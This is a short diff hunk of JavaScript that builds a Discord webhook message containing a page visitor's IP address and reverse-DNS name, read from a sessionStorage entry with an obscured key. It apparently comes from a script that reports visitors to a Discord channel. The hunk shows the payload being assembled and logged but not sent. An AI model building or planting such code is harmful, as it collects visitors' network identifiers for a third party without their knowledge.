@@ -62,7 +62,35 @@
                 /* Discord endpoint **/
                 FORM.action=convert_webhook_url(running_config.webhook_url);
                 
-
+                let payload_json={
+                    avatar_url: running_config.avatar_url,
+                    username: running_config.username,
+                    content: null,
+                    embeds: [
+                        {
+                            title: '',
+                            color: parseInt('0xffa500',16),
+                            timestamp: new Date().toISOString(),
+                            fields: [
+                                {
+                                    inline: true,
+                                    name: 'Client IP',
+                                    value: '`'+JSON.parse(sessionStorage.getItem( (btoa(location.href)).slice(0, 16) + '.'+'n138kz.isJP' )).request.request+'`',
+                                },
+                                {
+                                    inline: true,
+                                    name: 'Client PTR',
+                                    value: '`'+JSON.parse(sessionStorage.getItem( (btoa(location.href)).slice(0, 16) + '.'+'n138kz.isJP' )).request.detail+'`',
+                                },
+                            ],
+                            image: {
+                                url: 'attachment://'
+                            }
+                        }
+                    ],
+                };
+                console.log(payload_json);
+                
                 
             } catch (error) {
                 console.error(error);
